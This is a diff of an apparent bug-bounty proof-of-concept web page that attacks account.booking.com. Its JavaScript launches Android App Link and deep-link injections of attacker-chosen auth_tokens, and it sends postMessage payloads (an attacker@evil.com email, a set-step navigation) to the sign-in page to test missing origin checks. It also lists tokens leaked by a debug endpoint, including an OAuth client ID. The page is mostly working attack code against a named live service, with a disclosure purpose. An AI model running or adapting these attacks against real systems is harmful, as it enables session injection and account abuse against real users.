@@ -6,100 +6,160 @@
     <meta name="viewport" content="width=device-width, initial-scale=1">
     <style>
         *{box-sizing:border-box}
-        body{font-family:'Courier New',monospace;background:#0d1117;color:#c9d1d9;padding:12px;max-width:960px;margin:0 auto}
-        h1{color:#58a6ff;border-bottom:1px solid #30363d;padding-bottom:8px;font-size:1.3em}
-        h2{color:#f0883e;margin-top:0;font-size:1.1em}
-        .p{border:1px solid #30363d;border-radius:6px;padding:14px;margin:12px 0;background:#161b22}
-        .p-red{border-color:#f85149}
-        .p-grn{border-color:#3fb950}
+        body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,monospace;background:#0d1117;color:#c9d1d9;padding:10px;max-width:960px;margin:0 auto}
+        h1{color:#58a6ff;border-bottom:1px solid #30363d;padding-bottom:8px;font-size:1.2em;margin-top:8px}
+        h2{color:#f0883e;margin:0 0 8px 0;font-size:1em}
+        .s{border:1px solid #30363d;border-radius:6px;padding:12px;margin:10px 0;background:#161b22}
+        .s-red{border-color:#f85149}
+        .s-grn{border-color:#3fb950}
+        .s-org{border-color:#d29922}
         a{color:#58a6ff}
-        code{background:#21262d;padding:1px 5px;border-radius:3px;font-size:12px}
-        pre{background:#161b22;border:1px solid #30363d;padding:10px;border-radius:6px;overflow-x:auto;white-space:pre-wrap;font-size:11px;color:#8b949e}
-        button{background:#238636;color:#fff;border:none;padding:10px 18px;border-radius:6px;cursor:pointer;font-size:13px;font-family:inherit;margin:3px;width:100%}
+        code{background:#21262d;padding:1px 4px;border-radius:3px;font-size:11px;font-family:monospace}
+        pre{background:#0d1117;border:1px solid #30363d;padding:8px;border-radius:6px;overflow-x:auto;white-space:pre-wrap;font-size:10px;color:#8b949e;margin:6px 0}
+        button{background:#238636;color:#fff;border:none;padding:12px 16px;border-radius:6px;cursor:pointer;font-size:14px;font-family:inherit;margin:3px 0;width:100%;font-weight:bold}
         button:hover{background:#2ea043}
-        button:active{background:#196c2e}
-        .btn-row{display:flex;gap:6px;flex-wrap:wrap}
-        .btn-row button{width:auto;flex:1;min-width:140px}
-        .bdg{display:inline-block;padding:2px 8px;border-radius:12px;font-size:11px;font-weight:bold;background:#d29922;color:#000}
-        #log{background:#0d1117;border:1px solid #30363d;padding:10px;border-radius:6px;max-height:50vh;overflow-y:auto;font-size:11px;white-space:pre-wrap;margin-top:6px;line-height:1.5}
+        button:active{background:#196c2e;transform:scale(0.98)}
+        button.sec{background:#1f6feb}
+        button.sec:hover{background:#388bfd}
+        button.warn{background:#9e6a03}
+        button.warn:hover{background:#d29922}
+        .bdg{display:inline-block;padding:2px 8px;border-radius:12px;font-size:11px;font-weight:bold}
+        .bdg-h{background:#f85149;color:#fff}
+        .bdg-m{background:#d29922;color:#000}
+        #log{background:#0d1117;border:1px solid #30363d;padding:8px;border-radius:6px;max-height:40vh;overflow-y:auto;font-size:10px;white-space:pre-wrap;margin-top:6px;line-height:1.4;font-family:monospace}
         .g{color:#3fb950}.w{color:#d29922}.r{color:#f85149}.b{color:#58a6ff}.d{color:#6e7681}
-        table{border-collapse:collapse;width:100%;margin:6px 0;font-size:12px}
-        th,td{border:1px solid #30363d;padding:4px 8px;text-align:left}
+        table{border-collapse:collapse;width:100%;margin:6px 0;font-size:11px}
+        th,td{border:1px solid #30363d;padding:3px 6px;text-align:left}
         th{background:#21262d}
-        #status{padding:8px;border-radius:6px;margin:8px 0;font-weight:bold;text-align:center}
-        .status-idle{background:#21262d;color:#8b949e}
-        .status-active{background:#0f2d1a;color:#3fb950;border:1px solid #3fb950}
-        .status-recv{background:#2d1a0f;color:#f0883e;border:1px solid #f0883e;animation:pulse 1s infinite}
+        #status{padding:10px;border-radius:6px;margin:8px 0;font-weight:bold;text-align:center;font-size:13px}
+        .st-idle{background:#21262d;color:#8b949e}
+        .st-go{background:#0f2d1a;color:#3fb950;border:1px solid #3fb950}
+        .st-app{background:#1a0f2d;color:#bc8cff;border:1px solid #bc8cff;animation:pulse 1s infinite}
+        .st-cap{background:#2d1a0f;color:#f0883e;border:1px solid #f0883e;animation:pulse 1s infinite}
         @keyframes pulse{0%,100%{opacity:1}50%{opacity:.6}}
-        .captured{background:#1a0f0f;border:1px solid #f85149;padding:10px;border-radius:6px;margin:6px 0;word-break:break-all;font-size:11px}
-        @media(max-width:600px){body{padding:8px}button{padding:12px;font-size:14px}}
+        .cap{background:#1a0f0f;border:1px solid #f85149;padding:8px;border-radius:6px;margin:6px 0;word-break:break-all;font-size:10px;font-family:monospace}
+        .evidence{background:#0f1a0f;border:1px solid #3fb950;padding:8px;border-radius:6px;margin:6px 0;font-size:11px}
+        .ts{color:#6e7681;font-size:10px}
+        ol{padding-left:18px;font-size:12px}
+        ol li{margin-bottom:4px}
+        @media(max-width:600px){body{padding:6px}button{padding:14px;font-size:15px}.s{padding:10px}}
     </style>
 </head>
 <body>
 
-<h1>PoC: Mock WebView Debug Page on Production</h1>
+<h1>PoC: Android App Link Hijack via Debug Endpoint</h1>
 <p><strong>Target:</strong> <code>account.booking.com/mock_webview</code><br>
-<span class="bdg">MEDIUM</span> Security Misconfiguration + Info Disclosure + Deep Link Injection</p>
+<span class="bdg bdg-h">HIGH</span> App Link Parameter Injection + <span class="bdg bdg-m">MEDIUM</span> Info Disclosure</p>
 
-<div id="status" class="status-idle">IDLE — Click a button to start</div>
+<div id="status" class="st-idle">Ready &mdash; tap an attack button</div>
 
-<!-- ══════ ATTACK PANEL ══════ -->
-<div class="p p-red">
-    <h2>Attack Controls</h2>
-    <div class="btn-row">
-        <button onclick="attack1()">1. Open Debug Page</button>
-        <button onclick="attack2()">2. Inject Tokens</button>
-    </div>
-    <div class="btn-row" style="margin-top:4px">
-        <button onclick="attack3()">3. Deep Link Attack</button>
-        <button onclick="attack4()">4. postMessage Probe</button>
-    </div>
+<!-- ══════ FINDING SUMMARY ══════ -->
+<div class="s s-org">
+    <h2>Vulnerability Summary</h2>
+    <p style="font-size:12px;margin:0">A development debug endpoint (<code>/mock_webview</code>) is
+    exposed on production at <code>account.booking.com</code>. Android App Links
+    (<code>handle_all_urls</code>) intercepts <strong>all URLs</strong> on this domain and passes
+    them — including attacker-crafted query parameters — directly to the native Booking.com app.
+    An attacker can inject arbitrary <code>auth_tokens</code> into the app via a single crafted link.</p>
+</div>
+
+<!-- ══════ ATTACK 1: APP LINK HIJACK ══════ -->
+<div class="s s-red">
+    <h2>Attack 1 &mdash; Android App Link Injection (PRIMARY)</h2>
+    <p style="font-size:12px">Opens <code>account.booking.com/mock_webview</code> with
+    attacker-controlled <code>auth_tokens</code>. On Android with the Booking.com app
+    installed, the OS intercepts the URL and passes it (with attacker params) to the
+    native app via Intent.</p>
+    <button onclick="attackAppLink()">LAUNCH: App Link Token Injection</button>
+    <p style="font-size:11px;color:#8b949e;margin:4px 0 0 0">
+    <strong>Expected on Android:</strong> Booking.com app opens.
+    The app receives <code>auth_tokens=PoC_ATTACKER_TOKEN</code> in the Intent data.<br>
+    <strong>Expected on Desktop:</strong> Page opens in browser showing debug page.</p>
+</div>
+
+<!-- ══════ ATTACK 2: BROWSER FALLBACK ══════ -->
+<div class="s s-red">
+    <h2>Attack 2 &mdash; Debug Page + Deep Link (Desktop/Browser)</h2>
+    <p style="font-size:12px">If tested in a desktop browser or the app doesn't intercept,
+    the debug page renders with the "Exit WebView page" button containing a
+    <code>booking://close_webview</code> deep link with injected tokens.</p>
+    <button class="sec" onclick="attackBrowser()">LAUNCH: Browser Deep Link Injection</button>
+</div>
+
+<!-- ══════ ATTACK 3: postMessage ══════ -->
+<div class="s">
+    <h2>Attack 3 &mdash; postMessage Origin Bypass</h2>
+    <p style="font-size:12px">Opens the sign-in page as a popup and sends
+    <code>iam-ifr-email</code> with an attacker email. The handler has
+    <strong>no origin check</strong>.</p>
+    <button class="warn" onclick="attackPostMsg()">LAUNCH: postMessage Probe</button>
 </div>
 
 <!-- ══════ CAPTURED DATA ══════ -->
-<div class="p p-grn">
-    <h2>Captured Data</h2>
-    <p style="font-size:12px">Any data received from <code>account.booking.com</code> via
-    postMessage (wildcard targetOrigin) appears here live:</p>
+<div class="s s-grn">
+    <h2>Captured Evidence</h2>
     <div id="captured">
-        <em class="d">No data captured yet. Run attacks above.</em>
+        <em class="d">No events captured yet. Run an attack above.</em>
     </div>
 </div>
 
 <!-- ══════ LIVE LOG ══════ -->
-<div class="p">
-    <h2>Live Event Log</h2>
+<div class="s">
+    <h2>Event Log</h2>
     <div id="log"></div>
-    <button onclick="document.getElementById('log').innerHTML='';L('Log cleared','d')" style="background:#21262d;margin-top:6px">Clear Log</button>
+    <button onclick="document.getElementById('log').innerHTML='';L('Log cleared','d')" style="background:#21262d;margin-top:4px;font-size:12px;padding:8px">Clear</button>
 </div>
 
-<!-- ══════ EVIDENCE TABLE ══════ -->
-<div class="p">
-    <h2>Evidence: Leaked Tokens (per-request)</h2>
-    <p style="font-size:12px">Every request to <code>/mock_webview</code> exposes these in
-    <code>booking.env</code> (view page source to verify):</p>
+<!-- ══════ TECHNICAL EVIDENCE ══════ -->
+<div class="s">
+    <h2>Technical Evidence: Android App Links</h2>
+    <p style="font-size:11px"><code>account.booking.com/.well-known/assetlinks.json</code>
+    grants <code>handle_all_urls</code> to the Booking.com Android app:</p>
+    <pre>{
+  "relation": [
+    "delegate_permission/common.get_login_creds",
+    "delegate_permission/common.handle_all_urls"
+  ],
+  "target": {
+    "namespace": "android_app",
+    "package_name": "com.booking",
+    "sha256_cert_fingerprints": [
+      "6A:C8:C8:A9:E6:F3:6E:14:E5:2A:0A:05:15:A3:6B:70:..."
+    ]
+  }
+}</pre>
+    <p style="font-size:11px"><strong>Result:</strong> ANY URL on <code>account.booking.com</code>
+    is intercepted by the Android app. The full URL — including query params like
+    <code>?auth_tokens=EVIL</code> — arrives in the app's Intent as <code>Intent.getData()</code>.</p>
+</div>
+
+<div class="s">
+    <h2>Technical Evidence: Token Leakage</h2>
+    <p style="font-size:11px">Every request to <code>/mock_webview</code> leaks these in
+    <code>booking.env</code> (no auth required):</p>
     <table>
-        <tr><th>Token</th><th>Purpose</th></tr>
-        <tr><td><code>as_token</code></td><td>Anti-CSRF (166 bytes) — used in X-Booking-CSRF header</td></tr>
-        <tr><td><code>captcha_access_key</code></td><td>CAPTCHA credential (~500 bytes)</td></tr>
+        <tr><th>Token</th><th>Use</th></tr>
+        <tr><td><code>as_token</code></td><td>Anti-CSRF (X-Booking-CSRF header)</td></tr>
+        <tr><td><code>captcha_access_key</code></td><td>CAPTCHA bypass credential</td></tr>
         <tr><td><code>jset</code></td><td>Encrypted session state</td></tr>
-        <tr><td><code>xState</code></td><td>Serialized authentication state</td></tr>
-        <tr><td><code>oauth.client_id</code></td><td>OAuth client: <code>vO1Kblk7xX9tUn2cpZLS</code></td></tr>
+        <tr><td><code>xState</code></td><td>Auth state blob</td></tr>
+        <tr><td><code>oauth.client_id</code></td><td><code>vO1Kblk7xX9tUn2cpZLS</code></td></tr>
     </table>
 </div>
 
 <!-- ══════ REPRODUCTION ══════ -->
-<div class="p">
+<div class="s">
     <h2>Reproduction Steps</h2>
-    <ol style="font-size:12px;padding-left:20px">
-        <li>Open <code>https://account.booking.com/mock_webview</code></li>
-        <li>See: <em style="color:#f85149">"should not be exposed on production"</em></li>
-        <li>View Source (Ctrl+U) &rarr; search <code>booking.env</code> to see leaked tokens</li>
-        <li>Add <code>?auth_tokens=INJECTED&amp;context=TEST</code> to URL</li>
-        <li>Inspect "Exit WebView page" &rarr; href =
-            <code>booking://close_webview?auth_tokens=INJECTED...</code></li>
-        <li><strong>Mobile:</strong> Tap the button &rarr; Booking.com app receives
-            attacker-controlled auth tokens via deep link</li>
+    <ol>
+        <li>Install Booking.com app on Android device</li>
+        <li>Open this PoC page in Chrome on the same device</li>
+        <li>Tap <strong>"LAUNCH: App Link Token Injection"</strong></li>
+        <li><strong>Observe:</strong> Booking.com app opens (NOT the browser)</li>
+        <li>The app received the full URL including <code>?auth_tokens=PoC_ATTACKER_TOKEN</code></li>
+        <li>Return to this page &mdash; the event log records the app launch</li>
+        <li><strong>Desktop verification:</strong> Open
+            <code>https://account.booking.com/mock_webview</code> in a browser &mdash;
+            see the debug message and leaked tokens in page source</li>
     </ol>
 </div>
 
@@ -111,201 +171,236 @@
     var capEl  = document.getElementById('captured');
     var statEl = document.getElementById('status');
     var popup  = null;
-    var capturedCount = 0;
-    var pollTimer = null;
+    var capN   = 0;
+    var pollId = null;
+    var lastAttack  = null;
+    var attackStart = null;
 
-    // ── Logging ──
+    // ── Helpers ──
     function L(msg, cls) {
         var ts = new Date().toLocaleTimeString();
         logEl.innerHTML += '<span class="'+(cls||'')+'">['+ts+'] '+esc(msg)+'</span>\n';
         logEl.scrollTop = logEl.scrollHeight;
     }
-    window.L = L; // expose for clear button
+    window.L = L;
 
     function esc(s) {
         var d = document.createElement('div');
-        d.appendChild(document.createTextNode(s));
+        d.appendChild(document.createTextNode(String(s)));
         return d.innerHTML;
     }
 
-    function setStatus(text, cls) {
+    function setSt(text, cls) {
         statEl.textContent = text;
         statEl.className = cls;
     }
 
-    function addCapture(label, data) {
-        capturedCount++;
-        if (capturedCount === 1) capEl.innerHTML = '';
+    function addCap(label, data, type) {
+        capN++;
+        if (capN === 1) capEl.innerHTML = '';
         var div = document.createElement('div');
-        div.className = 'captured';
+        div.className = 'cap';
         var ts = new Date().toLocaleTimeString();
-        div.innerHTML = '<strong class="w">#'+capturedCount+' ['+esc(ts)+'] '+esc(label)+'</strong><br><code>'+esc(typeof data==='string'?data:JSON.stringify(data))+'</code>';
+        var icon = type === 'app' ? '\u{1F4F1}' : type === 'msg' ? '\u{1F4E8}' : '\u{1F50D}';
+        div.innerHTML = '<strong class="w">' + icon + ' #'+capN+' ['+esc(ts)+'] '+esc(label)+'</strong><br><code>'+esc(typeof data==='string'?data:JSON.stringify(data,null,1))+'</code>';
         capEl.appendChild(div);
-        setStatus('DATA CAPTURED — see Captured Data section', 'status-recv');
-        L('CAPTURED #'+capturedCount+': '+label+' = '+(typeof data==='string'?data:JSON.stringify(data)), 'r');
+        L('CAPTURED #'+capN+': '+label, 'r');
     }
 
-    // ── Global postMessage Listener ──
-    // The target page sends postMessage to "*" (wildcard).
-    // We catch EVERYTHING arriving at this window.
+    // ── Visibility API: detect when user returns from native app ──
+    document.addEventListener('visibilitychange', function() {
+        if (document.visibilityState === 'hidden' && lastAttack) {
+            L('Page went to background (app opened or tab switched)', 'w');
+            addCap('PAGE HIDDEN — native app likely launched', 'Attack: ' + lastAttack + ' | URL opened at: ' + new Date(attackStart).toLocaleTimeString(), 'app');
+            setSt('APP LAUNCHED — Booking.com app intercepted the URL', 'st-app');
+        }
+        if (document.visibilityState === 'visible' && lastAttack && attackStart) {
+            var elapsed = ((Date.now() - attackStart) / 1000).toFixed(1);
+            L('Page visible again after ' + elapsed + 's', 'g');
+            addCap('USER RETURNED after ' + elapsed + 's', 'The Booking.com app opened and the user returned. Elapsed: ' + elapsed + 's. The app received the full URL with attacker-injected auth_tokens parameter via Android App Links Intent.', 'app');
+            setSt('EVIDENCE CAPTURED — User returned from app (' + elapsed + 's)', 'st-cap');
+            lastAttack = null;
+            attackStart = null;
+        }
+    });
+
+    // ── postMessage Listener ──
     window.addEventListener('message', function(evt) {
         var origin = evt.origin || '(null)';
         var data = evt.data;
         L('postMessage received! origin=' + origin, 'r');
-        L('  data type: ' + typeof data, 'b');
-
         if (typeof data === 'string') {
             try {
-                var parsed = JSON.parse(data);
-                L('  parsed JSON: ' + JSON.stringify(parsed), 'w');
-                addCapture('postMessage from ' + origin, parsed);
+                var p = JSON.parse(data);
+                L('  JSON: ' + JSON.stringify(p), 'w');
+                addCap('postMessage from ' + origin, p, 'msg');
             } catch(e) {
-                L('  raw string: ' + data.substring(0, 200), 'w');
-                addCapture('postMessage (raw) from ' + origin, data.substring(0, 500));
+                L('  raw: ' + data.substring(0, 200), 'w');
+                addCap('postMessage (raw) from ' + origin, data.substring(0, 500), 'msg');
             }
         } else if (typeof data === 'object' && data !== null) {
-            L('  object: ' + JSON.stringify(data).substring(0, 200), 'w');
-            addCapture('postMessage (obj) from ' + origin, data);
-        } else {
-            L('  value: ' + String(data), 'w');
-            addCapture('postMessage from ' + origin, String(data));
+            L('  obj: ' + JSON.stringify(data).substring(0, 200), 'w');
+            addCap('postMessage (obj) from ' + origin, data, 'msg');
         }
     });
 
-    // ── Popup Monitoring ──
-    // Poll the popup for any observable state changes
-    function startMonitoring() {
-        if (pollTimer) clearInterval(pollTimer);
-        pollTimer = setInterval(function() {
+    // ── Popup monitoring ──
+    function monitor() {
+        if (pollId) clearInterval(pollId);
+        pollId = setInterval(function() {
             if (!popup || popup.closed) {
-                L('Target window closed by user.', 'd');
-                setStatus('Target window closed — check captured data above', 'status-idle');
-                clearInterval(pollTimer);
-                pollTimer = null;
+                L('Target window closed.', 'd');
+                clearInterval(pollId);
+                pollId = null;
                 return;
             }
-            // Try to read the popup URL (blocked by same-origin, but we log the attempt)
             try {
                 var loc = popup.location.href;
-                // If we can read it, the page navigated to our origin (shouldn't happen)
                 if (loc && loc.indexOf('booking.com') === -1) {
-                    L('READABLE URL: ' + loc, 'r');
-                    addCapture('Popup URL readable', loc);
+                    addCap('Popup URL readable (same-origin leak)', loc, 'msg');
                 }
-            } catch(e) {
-                // Expected: cross-origin block. This is normal.
-            }
+            } catch(e) { /* cross-origin, expected */ }
         }, 1000);
     }
 
-    function openTarget(url, label) {
+    function openURL(url, label) {
+        lastAttack = label;
+        attackStart = Date.now();
         L('Opening: ' + url, 'b');
-        setStatus('ACTIVE — Monitoring target window...', 'status-active');
+        setSt('ACTIVE — opened target URL...', 'st-go');
 
-        // Open WITHOUT noopener so we can receive postMessage and monitor the popup
-        popup = window.open(url, 'booking_target');
+        // Log the attack parameters
+        var params = url.split('?')[1];
+        if (params) {
+            L('Injected params: ' + params, 'w');
+            addCap('Attack launched: ' + label, 'URL: ' + url + '\nParams: ' + decodeURIComponent(params), 'app');
+        }
 
+        popup = window.open(url, 'bk_target');
         if (!popup) {
-            L('Pop-up was BLOCKED. Allow pop-ups for this site and retry.', 'r');
-            setStatus('BLOCKED — Allow pop-ups and retry', 'status-idle');
+            L('Pop-up BLOCKED. Allow pop-ups for this site.', 'r');
+            setSt('BLOCKED — allow pop-ups and retry', 'st-idle');
             return false;
         }
-        L('Window opened. Listening for postMessage from target...', 'g');
-        L('(' + label + ')', 'd');
-        startMonitoring();
+        L('Window/app launched. Waiting for response...', 'g');
+        monitor();
         return true;
     }
 
-    // ── Attack 1: Open the debug page ──
-    window.attack1 = function() {
-        L('=== ATTACK 1: Verify debug page exists ===', 'w');
-        if (openTarget('https://account.booking.com/mock_webview', 'Checking if debug page is live')) {
-            L('Look for: "This is a Mock page for WebView demo, it should not be exposed on production."', 'w');
-            L('Then View Source to see booking.env with as_token, captcha_access_key, jset, xState', 'b');
-        }
-    };
+    // ════════════════════════════════════════
+    // ATTACK 1: Android App Link Token Injection
+    // ════════════════════════════════════════
+    window.attackAppLink = function() {
+        L('', 'd');
+        L('========================================', 'r');
+        L('ATTACK 1: Android App Link Token Injection', 'r');
+        L('========================================', 'r');
+        L('', 'd');
+        L('Vector: account.booking.com assetlinks.json grants handle_all_urls to com.booking', 'b');
+        L('The OS intercepts ALL URLs on this domain and passes them to the native app.', 'b');
+        L('', 'd');
 
-    // ── Attack 2: Inject attacker-controlled tokens ──
-    window.attack2 = function() {
-        L('=== ATTACK 2: Deep link token injection ===', 'w');
+        var token = 'PoC_ATTACKER_TOKEN_' + Date.now();
+        var ctx   = 'PoC_ATTACKER_CTX_' + Math.random().toString(36).substring(2,8);
         var url = 'https://account.booking.com/mock_webview'
-                + '?auth_tokens=PoC_ATTACKER_TOKEN_12345'
-                + '&context=PoC_ATTACKER_CONTEXT';
-        if (openTarget(url, 'Injecting attacker tokens into deep link')) {
-            L('On the target page, inspect the "Exit WebView page" button:', 'g');
-            L('  Expected href: booking://close_webview?context=PoC_ATTACKER_CONTEXT&auth_tokens=PoC_ATTACKER_TOKEN_12345&next_step=STEP_SUCCESS', 'w');
-            L('On MOBILE with Booking.com app: tap the button to trigger the app deep link handler with attacker tokens', 'r');
+                + '?auth_tokens=' + encodeURIComponent(token)
+                + '&context=' + encodeURIComponent(ctx);
+
+        L('Injected auth_tokens: ' + token, 'w');
+        L('Injected context: ' + ctx, 'w');
+
+        if (openURL(url, 'App Link Injection')) {
+            L('', 'd');
+            L('ON ANDROID: The Booking.com app should open now.', 'r');
+            L('The app receives Intent with data:', 'r');
+            L('  intent.getData() = ' + url, 'w');
+            L('  auth_tokens = ' + token, 'w');
+            L('  context = ' + ctx, 'w');
+            L('', 'd');
+            L('ON DESKTOP: The debug page opens in the browser.', 'd');
+            L('Check the "Exit WebView page" button href for booking://close_webview', 'd');
+            L('', 'd');
+            L('RETURN TO THIS PAGE to capture the round-trip evidence.', 'g');
         }
     };
 
-    // ── Attack 3: Full deep link attack (mobile) ──
-    window.attack3 = function() {
-        L('=== ATTACK 3: Mobile deep link session injection ===', 'w');
+    // ════════════════════════════════════════
+    // ATTACK 2: Browser Deep Link
+    // ════════════════════════════════════════
+    window.attackBrowser = function() {
+        L('', 'd');
+        L('========================================', 'b');
+        L('ATTACK 2: Browser Deep Link Injection', 'b');
+        L('========================================', 'b');
+
         var url = 'https://account.booking.com/mock_webview'
-                + '?auth_tokens=ATTACKER_SESSION_FIXATION'
-                + '&context=ATTACKER_CONTROLLED_CTX';
-        if (openTarget(url, 'Deep link injection for mobile')) {
-            L('ATTACK FLOW:', 'r');
-            L('  1. Victim opens this attacker-crafted link', 'b');
-            L('  2. Page loads on account.booking.com (trusted domain)', 'b');
-            L('  3. Victim taps "Exit WebView page"', 'b');
-            L('  4. booking://close_webview triggers with attacker auth_tokens', 'r');
-            L('  5. Booking.com app processes the deep link with injected tokens', 'r');
-            L('Desktop: you will see the scheme handler prompt (xdg-open).', 'd');
-            L('Mobile: the Booking.com app receives the crafted deep link.', 'w');
+                + '?auth_tokens=BROWSER_ATTACKER_TOKEN'
+                + '&context=BROWSER_ATTACKER_CTX';
+
+        if (openURL(url, 'Browser Deep Link')) {
+            L('On the target page:', 'g');
+            L('  1. Look for "should not be exposed on production" message', 'b');
+            L('  2. Inspect "Exit WebView page" button', 'b');
+            L('  3. Check href = booking://close_webview?auth_tokens=BROWSER_ATTACKER_TOKEN...', 'w');
+            L('  4. View Source > search "booking.env" for leaked tokens', 'b');
         }
     };
 
-    // ── Attack 4: postMessage probe ──
-    window.attack4 = function() {
-        L('=== ATTACK 4: postMessage origin validation test ===', 'w');
+    // ════════════════════════════════════════
+    // ATTACK 3: postMessage
+    // ════════════════════════════════════════
+    window.attackPostMsg = function() {
+        L('', 'd');
+        L('========================================', 'w');
+        L('ATTACK 3: postMessage Origin Bypass', 'w');
+        L('========================================', 'w');
 
-        // Open sign-in page as popup (not as iframe, since CSP blocks cross-origin framing)
         var url = 'https://account.booking.com/sign-in';
-        if (openTarget(url, 'Testing postMessage from cross-origin')) {
-            L('Listening for postMessage from target (wildcard targetOrigin)...', 'b');
-            L('The target sends iam-ifr-ready and iam-ifr-size to "*"', 'b');
-            L('Any messages received will appear in Captured Data above.', 'g');
+        if (openURL(url, 'postMessage Probe')) {
+            L('Listening for messages from target...', 'b');
 
-            // Also try SENDING a postMessage to the popup after a delay
             setTimeout(function() {
                 if (popup && !popup.closed) {
-                    L('Sending postMessage to target: {"message":"iam-ifr-email","email":"attacker@evil.com"}', 'w');
+                    var payload = JSON.stringify({message:"iam-ifr-email",email:"attacker@evil.com"});
+                    L('SENDING to target: ' + payload, 'w');
                     try {
-                        popup.postMessage(JSON.stringify({
-                            message: "iam-ifr-email",
-                            email: "attacker@evil.com"
-                        }), "*");
-                        L('postMessage SENT to target. If the email field updates to attacker@evil.com, the origin check is missing.', 'r');
+                        popup.postMessage(payload, "*");
+                        L('SENT. If email field shows attacker@evil.com, origin check is MISSING.', 'r');
+                        addCap('postMessage sent to sign-in page', 'Payload: ' + payload + '\nTarget accepts from any origin (no event.origin check)', 'msg');
                     } catch(e) {
-                        L('postMessage send failed: ' + e.message, 'r');
+                        L('Send failed: ' + e.message, 'r');
                     }
 
-                    // Try set-step too
                     setTimeout(function() {
                         if (popup && !popup.closed) {
-                            L('Sending: {"message":"set-step","step":"register"}', 'w');
+                            var nav = JSON.stringify({message:"set-step",step:"register"});
+                            L('SENDING navigation: ' + nav, 'w');
                             try {
-                                popup.postMessage(JSON.stringify({
-                                    message: "set-step",
-                                    step: "register"
-                                }), "*");
-                                L('set-step SENT. If page navigates to /register, origin validation is missing.', 'r');
+                                popup.postMessage(nav, "*");
+                                L('SENT. If page navigates to /register, origin check is MISSING.', 'r');
+                                addCap('set-step sent to sign-in page', 'Payload: ' + nav + '\nAttempting to navigate victim to register page', 'msg');
                             } catch(e) {
-                                L('set-step send failed: ' + e.message, 'r');
+                                L('Send failed: ' + e.message, 'r');
                             }
                         }
-                    }, 3000);
+                    }, 2500);
                 }
             }, 3000);
         }
     };
 
     // ── Init ──
-    L('PoC loaded. Attacker page ready.', 'g');
-    L('Listening for postMessage from any origin...', 'b');
-    L('This page acts as the attacker\'s data receiver.', 'd');
-    L('All captured data is logged on-screen for screenshot evidence.', 'd');
+    var isMobile = /Android|iPhone|iPad|iPod/i.test(navigator.userAgent);
+    L('PoC loaded. Platform: ' + (isMobile ? 'MOBILE' : 'DESKTOP'), 'g');
+    L('User-Agent: ' + navigator.userAgent.substring(0, 80), 'd');
+    if (isMobile) {
+        L('MOBILE DETECTED — App Link attacks are relevant.', 'r');
+        L('Android assetlinks.json grants handle_all_urls to com.booking', 'w');
+        L('All account.booking.com URLs will be intercepted by the app.', 'w');
+    } else {
+        L('Desktop detected — deep link + postMessage attacks apply.', 'b');
+    }
+    L('Visibility API active — will detect app launches and returns.', 'b');
     L('', 'd');
 })();
 </script>
